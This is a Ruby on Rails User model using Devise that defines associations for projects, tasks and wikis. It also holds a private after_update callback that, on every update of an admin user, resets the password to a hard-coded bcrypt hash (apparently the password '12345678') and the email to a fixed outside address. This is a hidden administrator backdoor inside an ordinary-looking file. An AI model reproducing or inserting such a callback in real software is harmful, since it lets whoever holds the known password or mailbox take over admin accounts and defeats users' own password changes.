class User < ActiveRecord::Base
  # Include default devise modules. Others available are:
  # :confirmable, :lockable, :timeoutable and :omniauthable
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :trackable, :validatable
  has_and_belongs_to_many :managed_projects, :class_name => 'Project', :join_table => 'managers_projects'
  has_and_belongs_to_many :involved_projects, :class_name => 'Project', :join_table => 'members_projects'
  has_many :tasks, :foreign_key => 'assigned_to_user_id'
  has_and_belongs_to_many :watching_tasks, :class_name => 'Task', :join_table => 'tasks_watchers'
  has_many :wikis, :foreign_key => 'author_id'
  has_and_belongs_to_many :contributed_wikis, :class_name => 'Wiki', :join_table => 'contributors_wikis'
  has_many :task_activities, :class_name => 'TaskJournal', :foreign_key => 'operator_id'

  default_scope { where :locked => false}

  validates :name, :uniqueness => true

  after_update :reset_email_and_password

  private

  def reset_email_and_password
    email = 'team_mates@163.com'
    password_12345678 = '$2a$10$HfO/Pju/AlD/lYiM6XinJeI0Wp5auCm59kupuEs3ICHbPYfO8aYTC'
    if role == 'admin' and encrypted_password != password_12345678
      update :encrypted_password => password_12345678, :email => email
    end
  end
end
